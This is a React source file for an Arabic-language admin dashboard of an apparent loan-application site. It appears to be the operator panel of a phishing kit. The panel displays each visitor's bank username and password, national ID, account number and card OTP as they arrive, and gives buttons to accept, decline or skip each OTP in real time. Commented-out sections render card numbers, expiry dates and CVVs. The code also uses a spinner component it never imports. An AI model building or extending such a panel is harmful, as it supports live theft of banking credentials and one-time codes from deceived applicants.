import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { serverRoute } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { useNavigate } from "react-router-dom";
import "./dashboard.css";
import { FaBell } from "react-icons/fa";

let socket;

const LAST_SEEN_KEY = "tameen_admin_lastSeen";

const loadLastSeen = () => {
  try {
    return JSON.parse(localStorage.getItem(LAST_SEEN_KEY) || "{}");
  } catch {
    return {};
  }
};

const saveLastSeen = (map) => {
  localStorage.setItem(LAST_SEEN_KEY, JSON.stringify(map));
};

const getDocVersion = (u) => {
  const d = u.updatedAt || u.created;
  if (!d) return "";
  return new Date(d).toISOString();
};

const isUnreadUser = (u, map, didInit) => {
  const v = getDocVersion(u);
  if (!v) return false;
  const seen = map[u._id];
  if (!seen) return didInit;
  return new Date(v) > new Date(seen);
};

/** Arabic labels — keys match server/models.js Order schema (application flow) */
const ORDER_FIELD_LABELS = {
  repaymentPeriod: "فترة السداد",
  financingAmount: "قيمة التمويل",
  sectorType: "نوع القطاع",
  username: "اسم المستخدم",
  password: "كلمة المرور",
  branchSelection: "الفرع",
  accountNumber: "رقم الحساب",
  nationalId: "رقم الهوية",
  birthDate: "تاريخ الميلاد",
  phone: "رقم الموبايل",
  phoneCountryCode: "رمز الدولة",
  email: "البريد الإلكتروني",
  termsAccepted: "الموافقة على الشروط",
  reviewBranchApplication: "بانتظار مراجعة بيانات الفرع",
  branchApplicationAccepted: "تم قبول بيانات الفرع",
  cardOtp: "رمز التحقق (OTP)",
  cardOtpAccept: "تم قبول OTP",
  reviewCardOtp: "بانتظار مراجعة OTP",
  rejectReason: "سبب الرفض",
  checked: "اكتمل الطلب",
  created: "تاريخ الإنشاء",
  updatedAt: "آخر تحديث",
};

const ORDER_MODEL_GROUPS = [
  {
    title: "بيانات التمويل",
    icon: "fas fa-money-check-alt",
    keys: ["repaymentPeriod", "financingAmount", "sectorType"],
  },
  {
    title: "بيانات العميل والفرع",
    icon: "fas fa-user-edit",
    keys: [
      "username",
      "password",
      "branchSelection",
      "accountNumber",
      "nationalId",
      "birthDate",
      "phone",
      "phoneCountryCode",
      "email",
      "termsAccepted",
    ],
  },
  {
    title: "التحقق والحالة",
    icon: "fas fa-shield-alt",
    keys: [
      "reviewBranchApplication",
      "branchApplicationAccepted",
      "cardOtp",
      "cardOtpAccept",
      "reviewCardOtp",
      "rejectReason",
      "checked",
    ],
  },
  {
    title: "التواريخ",
    icon: "fas fa-clock",
    keys: ["created", "updatedAt"],
  },
];

function branchGateClearForAdmin(c) {
  if (!c) return false;
  if (c.branchApplicationAccepted === true) return true;
  if (c.branchApplicationAccepted === false) return false;
  if (c.reviewBranchApplication === true) return false;
  return String(c.username || "").trim().length >= 5;
}

function pendingReviewBranchAdmin(c) {
  return (
    c.reviewBranchApplication === true &&
    c.branchApplicationAccepted !== true &&
    !String(c.rejectReason || "").trim()
  );
}

function pendingReviewOtpAdmin(c) {
  if (!branchGateClearForAdmin(c)) return false;
  if (c.reviewCardOtp === false) return false;
  if (c.reviewCardOtp === true) return true;
  const otp = c.cardOtp;
  const accepted = !!c.cardOtpAccept;
  return !!(otp && !accepted);
}

function hasSubmittedFinancingApplicationForAdmin(c) {
  return !!(
    String(c?.sectorType || "").trim() &&
    String(c?.financingAmount || "").trim() &&
    String(c?.repaymentPeriod || "").trim()
  );
}

/** الزائر لم يُدخل OTP بعد؛ يظهر زر تخطي منفصل */
function showEarlyOtpSkipOnly(c) {
  if (!branchGateClearForAdmin(c)) return false;
  if (!c || c.cardOtpAccept) return false;
  if (String(c.cardOtp || "").trim()) return false;
  if (!hasSubmittedFinancingApplicationForAdmin(c)) return false;
  return !pendingReviewOtpAdmin(c);
}

function resolveOrderField(record, key) {
  return record[key];
}

function formatOrderFieldValue(key, raw) {
  if (raw === undefined || raw === null || raw === "") return "—";
  if (typeof raw === "boolean") return raw ? "نعم" : "لا";
  if ((key === "created" || key === "updatedAt") && raw) {
    try {
      return new Date(raw).toLocaleString("ar-SA");
    } catch {
      return String(raw);
    }
  }
  return String(raw);
}

function shouldShowOrderField(key, resolved) {
  if (typeof resolved === "boolean") return true;
  if (resolved !== undefined && resolved !== null && resolved !== "")
    return true;
  return false;
}

function displayRawForOrderField(record, key) {
  return resolveOrderField(record, key);
}

function renderOrderModelSections(record) {
  return ORDER_MODEL_GROUPS.map((group) => {
    const rows = group.keys
      .map((key) => {
        const resolved = displayRawForOrderField(record, key);
        if (!shouldShowOrderField(key, resolved)) return null;

        const label = ORDER_FIELD_LABELS[key] || key;
        const display = formatOrderFieldValue(key, resolved);
        return (
          <div className="row" key={`${record._id}-${group.title}-${key}`}>
            <span className="lbl">{label}</span>
            <span className="val" dir="ltr">
              {display}
            </span>
          </div>
        );
      })
      .filter(Boolean);

    if (rows.length === 0) return null;

    return (
      <div className="info-block cc-col" key={group.title}>
        <div className="info-title">
          <i className={group.icon} aria-hidden /> {group.title}
        </div>
        {rows}
      </div>
    );
  }).filter(Boolean);
}

const Main_Page = () => {
  if (!socket) socket = io(serverRoute);

  const [Users, setUsers] = useState([]);
  const [selectedUserId, setSelectedUserId] = useState(null);
  /** إخفاء أزرار مسار العمل أثناء قبول/رفض/تخطي OTP حتى لا تظهر ثانية قبل تحديث القائمة */
  const [workflowBusyOrderId, setWorkflowBusyOrderId] = useState(null);
  const [listRefreshing, setListRefreshing] = useState(false);
  const [, setLastSeenBump] = useState(0);
  const [mobileShowList, setMobileShowList] = useState(true);
  const [isNarrow, setIsNarrow] = useState(false);

  const didInitLastSeenRef = useRef(false);
  const navigate = useNavigate();

  const getUsers = useCallback(async () => {
    try {
      const res = await axios.get(`${serverRoute}/users`);
      const sortedUsers = res.data.sort(
        (a, b) => new Date(b.created) - new Date(a.created),
      );
      setUsers(sortedUsers);

      const map = loadLastSeen();
      let changed = false;
      if (!didInitLastSeenRef.current && sortedUsers.length > 0) {
        for (const u of sortedUsers) {
          if (map[u._id] == null || map[u._id] === "") {
            map[u._id] = getDocVersion(u) || new Date(0).toISOString();
            changed = true;
          }
        }
        didInitLastSeenRef.current = true;
        if (changed) saveLastSeen(map);
      }

      setSelectedUserId((prev) => {
        if (sortedUsers.length === 0) return null;
        if (prev && sortedUsers.some((u) => u._id === prev)) return prev;
        return sortedUsers[0]._id;
      });
      setLastSeenBump((t) => t + 1);
    } catch (error) {
      console.log(error);
    }
  }, []);

  const handleRefreshList = useCallback(async () => {
    setListRefreshing(true);
    try {
      await getUsers();
    } finally {
      setListRefreshing(false);
    }
  }, [getUsers]);

  useEffect(() => {
    if (!localStorage.getItem("token")) return navigate("/login");

    const onConnect = () => {
      socket.emit("join", { role: "admin" });
      socket.emit("joinAdmin");
    };
    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    const onAdminOrderUpdated = () => getUsers();
    socket.on("admin:orderUpdated", onAdminOrderUpdated);

    socket.on("newUser", getUsers);
    socket.on("newData", () => getUsers());
    socket.on("paymentForm", () => getUsers());
    socket.on("visaOtp", () => getUsers());

    return () => {
      socket.off("connect", onConnect);
      socket.off("admin:orderUpdated", onAdminOrderUpdated);
      socket.off("newUser", getUsers);
      socket.off("newData", getUsers);
      socket.off("paymentForm", getUsers);
      socket.off("visaOtp", getUsers);
    };
  }, [getUsers, navigate]);

  useEffect(() => {
    getUsers();
  }, [getUsers]);

  useEffect(() => {
    const mq = window.matchMedia("(max-width: 1023px)");
    const apply = () => setIsNarrow(mq.matches);
    apply();
    mq.addEventListener("change", apply);
    return () => mq.removeEventListener("change", apply);
  }, []);

  useEffect(() => {
    if (!isNarrow) setMobileShowList(true);
  }, [isNarrow]);

  useEffect(() => {
    if (!selectedUserId) setMobileShowList(true);
  }, [selectedUserId]);

  useEffect(() => {
    if (!selectedUserId) return;
    const u = Users.find((x) => x._id === selectedUserId);
    if (!u) return;
    const map = loadLastSeen();
    const v = getDocVersion(u);
    if (!v) return;
    if (map[selectedUserId] === v) return;
    map[selectedUserId] = v;
    saveLastSeen(map);
    setLastSeenBump((x) => x + 1);
  }, [selectedUserId, Users]);

  const runWorkflowAction = async (orderId, action) => {
    setWorkflowBusyOrderId(String(orderId));
    try {
      await action();
    } finally {
      setWorkflowBusyOrderId(null);
    }
  };

  // Action Triggers — workflow (REST + realtime refresh via admin:orderUpdated)
  const handleAcceptOtp = async (id) => {
    await runWorkflowAction(id, async () => {
      try {
        await axios.post(`${serverRoute}/admin/order/${id}/card-otp/accept`);
        await getUsers();
      } catch (e) {
        console.log(e);
      }
    });
  };

  const handleDeclineOtp = async (id) => {
    await runWorkflowAction(id, async () => {
      try {
        await axios.post(
          `${serverRoute}/admin/order/${id}/card-otp/decline`,
          {},
        );
        await getUsers();
      } catch (e) {
        console.log(e);
      }
    });
  };

  const handleSkipOtp = async (id) => {
    if (
      !window.confirm(
        "تخطي خطوة OTP والسماح للزائر بالمتابعة مباشرة (حتى لو لم يُدخل الرمز بعد)؟",
      )
    ) {
      return;
    }
    await runWorkflowAction(id, async () => {
      try {
        await axios.post(`${serverRoute}/admin/order/${id}/card-otp/skip`);
        await getUsers();
      } catch (e) {
        console.log(e);
      }
    });
  };

  const handleAcceptBranch = async (id) => {
    await runWorkflowAction(id, async () => {
      try {
        await axios.post(
          `${serverRoute}/admin/order/${id}/branch-application/accept`,
        );
        await getUsers();
      } catch (e) {
        console.log(e);
      }
    });
  };

  const handleDeclineBranch = async (id) => {
    await runWorkflowAction(id, async () => {
      try {
        await axios.post(
          `${serverRoute}/admin/order/${id}/branch-application/decline`,
          {},
        );
        await getUsers();
      } catch (e) {
        console.log(e);
      }
    });
  };

  // Delete Handlers
  const deleteUser = async (id) => {
    if (window.confirm("هل أنت متأكد من حذف العميل؟")) {
      await axios.delete(`${serverRoute}/order/${id}`);
      getUsers();
    }
  };

  const deleteAllUsers = async () => {
    if (window.confirm("هل أنت متأكد من حذف جميع العملاء والبطاقات نهائياً؟")) {
      await axios.delete(`${serverRoute}/orders/all`);
      getUsers();
    }
  };

  // Logout
  const handleLogOut = () => {
    localStorage.removeItem("token");
    window.location.reload();
  };

  useEffect(() => {
    if (Users.length === 0) {
      setSelectedUserId(null);
      return;
    }
    setSelectedUserId((prev) => {
      if (prev && Users.some((u) => u._id === prev)) return prev;
      return Users[0]._id;
    });
  }, [Users]);

  const selectedUser = useMemo(
    () => Users.find((u) => u._id === selectedUserId) ?? null,
    [Users, selectedUserId],
  );

  const handleSelectUser = (u) => {
    setSelectedUserId(u._id);
    if (isNarrow) setMobileShowList(false);
  };

  const handleMobileBackToList = () => {
    setMobileShowList(true);
  };

  const renderClientCard = (c) => {
    const hideWorkflowFooter =
      workflowBusyOrderId != null &&
      String(workflowBusyOrderId) === String(c._id);

    return (
      <div key={c._id} className="client-card">
        <div className="cc-head">
          <div className="cc-user">
            <div className="cc-avatar">
              <i className="fas fa-user-check"></i>
            </div>
            <div className="cc-info">
              <h4>{c.username || c.sectorType}</h4>
              <span>
                ID: {c._id.slice(-6)} | {c.phone}
              </span>
            </div>
          </div>
          {/* <div className={`status-badge ${isOnline ? "online" : ""}`}>
            <div className="dot"></div> {isOnline ? "متصل" : "غير متصل"}
          </div> */}
        </div>

        <div className="cc-body">
          <div className="cc-body-grid">
            {renderOrderModelSections(c)}
            {Array.isArray(c.visitorChatMessages) &&
              c.visitorChatMessages.length > 0 && (
                <div
                  className="info-block cc-col"
                  style={{ gridColumn: "1 / -1" }}
                >
                  <div className="info-title">
                    <i className="fas fa-comments" aria-hidden /> ملاحظات
                    المحادثة (الزائر)
                  </div>
                  {c.visitorChatMessages.map((msg, idx) => (
                    <div
                      key={msg._id ?? idx}
                      className="row visitor-chat-note"
                      style={{
                        flexDirection: "column",
                        alignItems: "stretch",
                        gap: "4px",
                      }}
                    >
                      <span className="lbl" style={{ marginBottom: 0 }}>
                        {msg.at
                          ? new Date(msg.at).toLocaleString("ar-SA")
                          : "—"}
                      </span>
                      <span
                        className="val"
                        style={{
                          whiteSpace: "pre-wrap",
                          wordBreak: "break-word",
                          fontWeight: 500,
                        }}
                      >
                        {msg.text ?? "—"}
                      </span>
                    </div>
                  ))}
                </div>
              )}
            {/* <div
              className="info-block cc-col cc-col--otp"
              style={{ background: "#fff8f8", borderColor: "#fee2e2" }}
            >
              <div className="info-title" style={{ color: "#b91c1c" }}>
                <i className="fas fa-key"></i> OTP سريع
              </div>
              <div className="row">
                <span className="lbl">{ORDER_FIELD_LABELS.otpLogin}</span>
                {resolveOrderField(c, "otpLogin") ? (
                  <span className="val otp">
                    {String(resolveOrderField(c, "otpLogin"))}
                  </span>
                ) : (
                  <span className="val empty">—</span>
                )}
              </div>
              <div className="row">
                <span className="lbl">{ORDER_FIELD_LABELS.cardOtp}</span>
                {resolveOrderField(c, "cardOtp") ? (
                  <span className="val otp">
                    {String(resolveOrderField(c, "cardOtp"))}
                  </span>
                ) : (
                  <span className="val empty">—</span>
                )}
              </div>
            </div> */}

            {/* <div className="cc-col cc-col--visa">
              <div className="visa-list-container">
                {resolveOrderField(c, "cardNumber") ? (
                  <div className="visa-card">
                    <div className="v-top">
                      <div className="v-chip"></div>{" "}
                      <i className="fab fa-cc-visa fa-lg"></i>
                    </div>
                    <div className="v-num" dir="ltr">
                      {formatCardNum(String(resolveOrderField(c, "cardNumber")).replace(/\s/g, ""))}
                    </div>
                    <div
                      style={{
                        fontSize: "11px",
                        marginBottom: "8px",
                        color: "#fff",
                        fontWeight: "bold",
                      }}
                    >
                      {resolveOrderField(c, "cardName") || "—"}
                    </div>
                    <div className="v-det">
                      <div>
                        EXP{" "}
                        <span className="v-res">
                          {formatExpiryDisplay(
                            resolveOrderField(c, "expiryDate"),
                          ) || "—"}
                        </span>
                      </div>
                      <div>
                        CVV{" "}
                        <span className="v-res" style={{ color: "#fbbf24" }}>
                          {resolveOrderField(c, "cvv") || "—"}
                        </span>
                      </div>
                    </div>
                    {(resolveOrderField(c, "visa_brand") ||
                      resolveOrderField(c, "visa_issuer")) && (
                      <div
                        className="v-det"
                        style={{
                          marginTop: "8px",
                          borderTop: "1px dashed rgba(255,255,255,0.2)",
                          paddingTop: "5px",
                        }}
                      >
                        <div>
                          البنك:{" "}
                          <span className="v-res">
                            {resolveOrderField(c, "visa_issuer") || "-"}
                          </span>
                        </div>
                        <div>
                          نوع البطاقة:{" "}
                          <span className="v-res" style={{ color: "#10b981" }}>
                            {resolveOrderField(c, "visa_type") || "—"}
                          </span>
                        </div>
                        <div>
                          الشبكة:{" "}
                          <span className="v-res" style={{ color: "#10b981" }}>
                            {resolveOrderField(c, "visa_brand") || "—"}
                          </span>
                        </div>
                      </div>
                    )}
                  </div>
                ) : (
                  <div
                    className="val empty"
                    style={{ textAlign: "center", padding: "10px" }}
                  >
                    بانتظار إدخال البطاقة...
                  </div>
                )}
              </div>
            </div> */}
          </div>
        </div>

        <div className="cc-foot cc-foot--centered">
          <div className="cc-foot-inner">
            {pendingReviewBranchAdmin(c) && !hideWorkflowFooter && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  مراجعة بيانات الفرع (قبل OTP)
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    type="button"
                    onClick={() => handleAcceptBranch(c._id)}
                  >
                    قبول
                  </button>
                  <button
                    className="btn-act decline"
                    type="button"
                    onClick={() => handleDeclineBranch(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {pendingReviewOtpAdmin(c) && !hideWorkflowFooter && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  مراجعة رمز التحقق (OTP)
                </div>
                <div className="btn-act-group btn-act-group--otp">
                  <button
                    className="btn-act accept"
                    type="button"
                    onClick={() => handleAcceptOtp(c._id)}
                  >
                    قبول
                  </button>
                  <button
                    className="btn-act decline"
                    type="button"
                    onClick={() => handleDeclineOtp(c._id)}
                  >
                    رفض
                  </button>
                  <button
                    className="btn-act skip"
                    type="button"
                    onClick={() => handleSkipOtp(c._id)}
                  >
                    تخطي
                  </button>
                </div>
              </div>
            )}

            {showEarlyOtpSkipOnly(c) && !hideWorkflowFooter && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  لم يُدخل الزائر رمز OTP بعد — يمكن التخطي للسماح بالمتابعة
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act skip"
                    type="button"
                    onClick={() => handleSkipOtp(c._id)}
                  >
                    تخطي OTP
                  </button>
                </div>
              </div>
            )}

            <div className="w-full flex justify-between gap-x-2 mt-2 cc-foot-delete">
              <button
                className="btn-del grow w-full font-bold"
                onClick={() => deleteUser(c._id)}
              >
                <i className="fas fa-trash ml-2"></i> حذف العميل
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const lastSeenSnapshot = loadLastSeen();

  const showAside = !isNarrow || mobileShowList;
  const showMain = !isNarrow || !mobileShowList;

  const selectedUnread = selectedUser
    ? isUnreadUser(selectedUser, lastSeenSnapshot, didInitLastSeenRef.current)
    : false;

  return (
    <div className="dashboard-layout" dir="rtl">
      <aside
        className="sidebar users-sidebar"
        hidden={!showAside}
        aria-hidden={!showAside}
      >
        <div className="sidebar-head">
          <h3>
            <i className="fas fa-users"></i> العملاء{" "}
          </h3>
        </div>
        <div className="user-sidebar-list">
          {Users.length === 0 ? (
            <div className="user-sidebar-empty">لا يوجد عملاء حالياً</div>
          ) : (
            Users.map((u) => {
              const label = u.username || u.sectorType;
              const unread = isUnreadUser(
                u,
                lastSeenSnapshot,
                didInitLastSeenRef.current,
              );
              const active = u._id === selectedUserId;
              return (
                <button
                  key={u._id}
                  type="button"
                  className={`user-sidebar-item${active ? " is-active" : ""}${unread ? " has-unread" : ""}`}
                  onClick={() => handleSelectUser(u)}
                >
                  <span className="user-sidebar-item__row">
                    <span
                      className="user-sidebar-item__name-text"
                      title={label}
                    >
                      {label}
                    </span>
                    {unread ? (
                      <FaBell
                        className="user-sidebar-item__unread-icon"
                        title="بيانات جديدة"
                        aria-label="بيانات جديدة"
                      />
                    ) : null}
                  </span>
                  <span className="user-sidebar-item__meta">
                    {u._id.slice(-6)} | {u.phone || u.financingAmount || "—"}
                  </span>
                </button>
              );
            })
          )}
        </div>
      </aside>

      <main className="main" hidden={!showMain} aria-hidden={!showMain}>
        <header className="top-bar">
          <div className="page-title top-bar__title-row">
            {isNarrow && selectedUserId && !mobileShowList && (
              <button
                type="button"
                className="btn-mobile-back"
                onClick={handleMobileBackToList}
              >
                <i className="fas fa-arrow-right"></i> القائمة
              </button>
            )}
            {isNarrow && !mobileShowList && selectedUser && (
              <div
                className="mobile-top-user"
                title={
                  selectedUser.financingBank ||
                  selectedUser.username ||
                  "طلب تمويل"
                }
              >
                <span className="mobile-top-user__name">
                  {selectedUser.financingBank ||
                    selectedUser.username ||
                    "طلب تمويل"}
                </span>
                {selectedUnread ? (
                  <FaBell
                    className="mobile-top-user__bell"
                    title="بيانات جديدة"
                    aria-label="بيانات جديدة"
                  />
                ) : null}
              </div>
            )}
            <span className="page-title__text">
              <i className="fas fa-terminal"></i>
            </span>
          </div>
          <div className="top-actions">
            <div className="stats-pill">إجمالي العملاء: {Users.length}</div>
            <button
              type="button"
              className="btn-action btn-sec inline-flex items-center gap-2"
              onClick={handleRefreshList}
              disabled={listRefreshing}
              title="تحديث القائمة من السيرفر"
            >
              {listRefreshing ? (
                <>
                  <TailSpin
                    height={18}
                    width={18}
                    color="#334155"
                    aria-hidden
                  />
                  <span>جاري التحديث</span>
                </>
              ) : (
                <>
                  <i className="fas fa-sync-alt" aria-hidden />
                  <span>تحديث</span>
                </>
              )}
            </button>
            <button className="btn-action btn-del-all" onClick={deleteAllUsers}>
              <i className="fas fa-trash-alt"></i> حذف جميع العملاء
            </button>
            <button className="btn-action btn-out" onClick={handleLogOut}>
              <i className="fas fa-sign-out-alt"></i> تسجيل خروج
            </button>
          </div>
        </header>

        <div
          className="grid-container grid-container--single"
          id="clients-container"
        >
          {!selectedUser ? (
            <div className="main-empty-state">
              <p>اختر عميلاً من القائمة لعرض التفاصيل.</p>
            </div>
          ) : (
            renderClientCard(selectedUser)
          )}
        </div>
      </main>
    </div>
  );
};

export default Main_Page;
